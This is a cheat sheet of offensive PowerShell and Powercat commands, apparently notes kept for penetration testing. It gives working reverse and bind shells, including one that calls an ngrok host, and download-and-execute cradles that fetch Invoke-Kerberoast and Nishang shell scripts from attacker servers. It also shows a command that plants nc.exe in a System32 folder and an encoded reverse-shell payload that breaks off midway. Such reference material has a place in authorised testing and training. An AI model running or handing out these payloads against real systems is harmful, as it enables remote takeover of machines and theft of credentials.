Powershell and Powercat

Powershell File Transfers http

~~~PowerShell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.7.30/Windows/nc.exe','C:\Windows\System32\spool\drivers\color\nc.exe')"

Powershell invoke-webrequest -uri "http://10.10.16.134/win/windows-privesc-check2.exe" -OutFile C:\Users\Public\Documents\wpec1.exe

powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://10.13.7.30/Windows/Powershell/Empire/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
~~~

Powershell Reverse Shells
 
PS1 Contents:

~~~PowerShell
$client = New-Object System.Net.Sockets.TCPClient('5.tcp.ngrok.io',26070);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
~~~

ONE-LINER:

~~~PowerShell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.49.69',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
~~~

Powershell Bind Shells

~~~PowerShell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
~~~

Nishang Powershell Reverse Shell

~~~PowerShell
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.49.69:80/Windows/Powershell/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
~~~

PowerCat

~~~bash
apt install powercat

/usr/share/windows-resources/powercat
~~~

Powercat reverse Shells

~~~bash
powercat -c 10.11.0.4 -p 443 -e cmd.exe
~~~

Powercat Bind Shells

~~~bash
powercat -l -p 443 -e cmd.exe
~~~

Encoded Powercat Reverse Shell

~~~bash
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
 
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
~~~

Powershell Listener

~~~PowerShell
$socket = new-object System.Net.Sockets.TcpListener('127.0.0.1', 413);
 
if($socket -eq $null){
exit 1
}
 
$socket.start()
$client = $socket.AcceptTcpClient()
write-output "[*] Connection!"
$stream = $client.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 2048;
$encoding = new-object System.Text.AsciiEncoding;
 
do
{
    $cmd = read-host
    $writer.WriteLine($cmd)
    $writer.Flush();
    if($cmd -eq "exit"){
        break
    }
$read = $null;
while($stream.DataAvailable -or $read -eq $null) {
$read = $stream.Read($buffer, 0, 2048)
            $out = $encoding.GetString($buffer, 0, $read)
            Write-Output $out
}
 
} While ($client.Connected -eq $true)
 
$socket.Stop()
$client.close();
$stream.Dispose()
~~~

